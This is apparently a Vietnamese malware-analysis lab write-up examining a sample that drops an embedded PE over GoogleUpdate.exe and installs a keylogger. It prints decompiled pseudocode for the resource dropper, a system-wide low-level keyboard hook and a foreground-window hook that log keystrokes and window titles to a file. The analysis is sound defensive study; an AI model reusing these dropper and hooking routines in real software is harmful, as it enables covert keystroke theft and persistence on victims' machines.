# **Lab_05-1.malware**
1. 
![[Pasted image 20260928084823.png]]
Check bằng DiE, ta thấy trong `.rsrc` có 1 file pe khác.
Phân tích tĩnh bằng IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  HMODULE ModuleHandleW; // eax

  ModuleHandleW = GetModuleHandleW(lpModuleName: nullptr);
  sub_401000(hModule: ModuleHandleW, lpFileName: L"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe");
  return 0;
}
```
Ta thấy chương trình gọi hàm `sub_401000` với 2 tham số: handle của chính nó, và 1 chuỗi đường dẫn GoogleUpdate. Đọc hàm `sub_401000`
```c
char __cdecl sub_401000(HMODULE hModule, LPCWSTR lpFileName)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-1Ch] BYREF
  LPCVOID lpBuffer; // [esp+4h] [ebp-18h]
  DWORD nNumberOfBytesToWrite; // [esp+8h] [ebp-14h]
  HGLOBAL hResData; // [esp+Ch] [ebp-10h]
  HANDLE hFile; // [esp+10h] [ebp-Ch]
  HRSRC hResInfo; // [esp+14h] [ebp-8h]
  char v9; // [esp+1Bh] [ebp-1h]

  v9 = 0;
  hResInfo = FindResourceW(hModule, lpName: L"DROP", lpType: L"RC_DATA");
  hResData = LoadResource(hModule, hResInfo);
  nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);
  lpBuffer = LockResource(hResData);
  hFile = CreateFileW(
            lpFileName,
            dwDesiredAccess: 0xC0000000,
            dwShareMode: 0,
            lpSecurityAttributes: nullptr,
            dwCreationDisposition: 2u,
            dwFlagsAndAttributes: 0x80u,
            hTemplateFile: nullptr);
  WriteFile(
    hFile,
    lpBuffer,
    nNumberOfBytesToWrite,
    lpNumberOfBytesWritten: &NumberOfBytesWritten,
    lpOverlapped: nullptr);
  CloseHandle(hObject: hFile);
  return 1;
}
```
Đoạn code này đã rõ ràng hơn về hành vi. Đầu tiên, nó dùng `FindResourceW` để tìm ra resource có tên `DROP` trong `.rsrc` (chính là file PE kia). Sau đó dùng `LoadResource` để ánh xạ resource vào không gian địa chỉ của tiến trình và lấy handle của resource đó. Rồi dùng `LockResource` để lấy con trỏ trỏ đến vùng nhớ đó. 
Tiếp theo, mở file có trong đường dẫn vừa được truyền vào hàm (`C:\\Program Files\\Google\\Update\\GoogleUpdate.exe`). Rồi ghi toàn bộ dữ liệu độc hại vừa lấy được trong `.rsrc` vào file đó. 
Vậy, thứ được malware ghi vào đĩa chính là resource độc hại trong `.rsrc`.

2. 
Bản thân thằng `C:\\Program Files\\Google\\Update\\GoogleUpdate.exe` đã là 1 thằng có persistence. Việc ghi đè dữ liệu vào file này nhằm tạo ra mã độc kế thừa cơ chế persistence có sẵn của file gốc. Đây là 1 signature tốt vì nó để lại trên máy 1 artifact cố định trên hệ thống (chính là file `GoogleUpdate.exe`), điều này giúp cho việc ra quét dễ dàng hơn.

3. 
Extract malware ra rồi phân tích bằng IDA.
Có vẻ như malware đã lỗi, khi gọi `CreateMutex`, nhưng lại không có bất cứ API nào để ngăn chặn 1 tiến trình thứ 2 sinh ra (như `GetLastError`).
```c
hObject = CreateMutexW(lpMutexAttributes: nullptr, bInitialOwner: false, lpName: L"WODUDE");
  if ( hObject == nullptr )
    return 0;
```

4. 
2 cơ chế ẩn mình của malware đó là:
- ==Giả danh:== Malware chạy tiến trình dưới tên `GoodleUpdate.exe`, nếu không kiểm tra kỹ thì chắc chắn không nhận ra.
- ==Ẩn console:== Dùng `ShowWindow()` với tham số thứ 2 là `0` để ẩn đi.

5. 
2 API quan trọng liên quan đến cơ chế keylogging là:
- `SetWindowHookExW`: với tham số `idHook: 13`, nó sẽ chặn bắt toàn bộ thông điệp liên quan đến bàn phím của toàn bộ hệ thống.
- `SetWinEventHook`: API này có tác dụng "nghe" các sự kiện liên quan đến giao diện và vòng đời cửa sổ, ở đây nó đang theo dõi các sự kiện về việc cửa sổ đang active trên màn hình bị thay đổi.
![[Pasted image 20260928094946.png]]

6. 
Các hằng số được truyền cho các API đó là:
```c
SetWindowsHookExW(idHook: 13, lpfn: fn, hmod, dwThreadId: 0);
```
- `idHook: 13`: Đây là hằng số `WH_KEYBOARD_LL` (Low level keyboard hook). Nó cho phép chương trình can thiệp và đọc dữ liệu phím bấm ở tầng thấp, ngay khi driver bàn phím chuyển thông điệp vào hệ thống và trước khi thông điệp kịp tới cửa sổ ứng dụng mục tiêu.
- `lpfn: fn`: Đây là con trỏ trỏ tới hàm callback xử lí sự kiện phím.
- `hmod`: Handle của module chứa hàm callback, nếu như trong trường hợp global hook, thì cần phải có handle của module để đẩy dll chứa callback vào không gian địa chỉ (nghĩa là tiến trình mục tiêu tự thực hiện callback). Nhưng đây là  Low Level Hook, chính tiến trình hook sẽ tự thực hiện callback, nên handle ở đây khả năng là hanlde của chính nó.
- `dwThreadId: 0`: Thread ID của tiến trình mà hook sẽ gắn vào, `0` có nghĩa là toàn hệ thống.

```c
SetWinEventHook(
    eventMin: 3u,
    eventMax: 3u,
    hmodWinEventProc: nullptr,
    pfnWinEventProc: pfnWinEventProc,
    idProcess: 0,
    idThread: 0,
    dwFlags: 2u);
```
- `eventMin: 3u` và `eventMax: 3u` (`EVENT_SYSTEM_FOREGROUND`): Giá trị `3` tương ứng với hằng số hệ thống `EVENT_SYSTEM_FOREGROUND`. Việc đặt cả `min` và `max` đều bằng `3` có nghĩa là hook này chỉ bắt duy nhất một loại sự kiện: Sự kiện cửa sổ đang active/focus trên màn hình bị thay đổi (người dùng bấm Alt+Tab, click chuột chọn cửa sổ khác, hoặc một ứng dụng mới mở lên đè lên trên).
- `hmodWinEventProc: nullptr`: Handle của DLL chứa hàm callback. Được đặt là `nullptr` vì hàm callback nằm trực tiếp bên trong file thực thi hiện tại, không cần nạp từ một file DLL rời bên ngoài.
- `pfnWinEventProc: pfnWinEventProc`: Con trỏ trỏ tới hàm callback xử lý sự kiện. Mỗi khi có cửa sổ mới được đưa lên tiền cảnh, hệ điều hành sẽ tự động gọi hàm này và truyền kèm: Handle của cửa sổ (`HWND`), Process ID (`idProcess`), Thread ID (`idEventThread`), và timestamp của sự kiện.
- `idProcess: 0`: Lọc theo Process ID. Giá trị `0` nghĩa là theo dõi toàn bộ các tiến trình đang chạy trên hệ thống mà không giới hạn riêng một phần mềm nào.
- `idThread: 0`: Lọc theo Thread ID. Giá trị `0` nghĩa là theo dõi toàn bộ các luồng (threads) thuộc tất cả tiến trình.
- `dwFlags: 2u` (`WINEVENT_SKIPOWNPROCESS`): Giá trị `2` là cờ `WINEVENT_SKIPOWNPROCESS`: Bỏ qua chính nó: Nếu chính tiến trình hiện tại tạo hoặc tự kích hoạt cửa sổ của nó, hệ điều hành sẽ bỏ qua, không kích hoạt hàm callback. Chạy Out-of-Context: Do không bật cờ `0x0004` (`WINEVENT_INCONTEXT`), hook này mặc định chạy ở chế độ **`WINEVENT_OUTOFCONTEXT`** (`0x0000`). Hệ điều hành gửi bản tin thông báo bất đồng bộ qua IPC về cho tiến trình hiện tại xử lý, tuyệt đối không tiêm (inject) mã vào tiến trình khác.

7. 
Ta sẽ xem thử hàm callback `fn` của `SetWindowHookExW`
```c
LRESULT __stdcall fn(int code, WPARAM wParam, int *lParam)
{
  const char *lpBuffer; // [esp+4h] [ebp-4h]

  lpBuffer = "[X]";
  if ( wParam == 257 )
  {
    lpBuffer = (const char *)sub_401440(C: *lParam, a2: 1);
  }
  else if ( wParam == 256 )
  {
    lpBuffer = (const char *)sub_401440(C: *lParam, a2: 0);
  }
  if ( lpBuffer != nullptr )
    sub_4013E0(lpBuffer);
  return 0;
}
```
`sub_401440` sau khi kiểm tra thì nó là các hàm log lại phím. Vậy thì chỉ còn 1 hàm khả nghi là `sub_4013E0`.
```c
int __cdecl sub_4013E0(void *lpBuffer)
{
  int result; // eax
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = 0;
  WriteFile(
    hFile: hFile,
    lpBuffer,
    nNumberOfBytesToWrite: 1u,
    lpNumberOfBytesWritten: &NumberOfBytesWritten,
    lpOverlapped: nullptr);
  if ( sub_401000(Str: (char *)lpBuffer, SubStr: (char *)L" ") != 0 )
    return FlushFileBuffers(hFile: hFile);
  result = sub_401000(Str: (char *)lpBuffer, SubStr: "[CR]");
  if ( result != 0 )
    return FlushFileBuffers(hFile: hFile);
  return result;
}
```
Nó thực hiện ghi toàn bộ log vào 1 file mới. Cụ thể:
- Nó thực hiện ghi dữ liệu vào RAM Cache của Windows (đọc cơ chế File System Caching để biết thêm).
- Nếu gặp phím enter hoặc khoảng trắng, thì sẽ flush cache (ghi xuống đĩa cứng) ngay lập tức.
Kiểm tra tiếp hàm callback của `SetWinEventHook`
```c
void __stdcall pfnWinEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD event,
        HWND hwnd,
        LONG idObject,
        LONG idChild,
        DWORD idEventThread,
        DWORD dwmsEventTime)
{
  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-Ch] BYREF
  const wchar_t *v8; // [esp+Ch] [ebp-8h]
  __int16 v9; // [esp+12h] [ebp-2h]

  dword_404374 = GetWindowTextW(hWnd: hwnd, lpString: lpBuffer, nMaxCount: 520);
  NumberOfBytesWritten = 0;
  v8 = L"\nForeground window changed to: ";
  do
    v9 = *v8++;
  while ( v9 != 0 );
  WriteFile(
    hFile: hFile,
    lpBuffer: L"\nForeground window changed to: ",
    nNumberOfBytesToWrite: 2 * (v8 - L"Foreground window changed to: "),
    lpNumberOfBytesWritten: &NumberOfBytesWritten,
    lpOverlapped: nullptr);
  WriteFile(
    hFile: hFile,
    lpBuffer: lpBuffer,
    nNumberOfBytesToWrite: 2 * dword_404374,
    lpNumberOfBytesWritten: &NumberOfBytesWritten,
    lpOverlapped: nullptr);
  WriteFile(
    hFile: hFile,
    lpBuffer: "\n",
    nNumberOfBytesToWrite: 2u,
    lpNumberOfBytesWritten: &NumberOfBytesWritten,
    lpOverlapped: nullptr);
}
```
Nó cũng thực hiện ghi log vào file mỗi lần máy chuyển focus window.
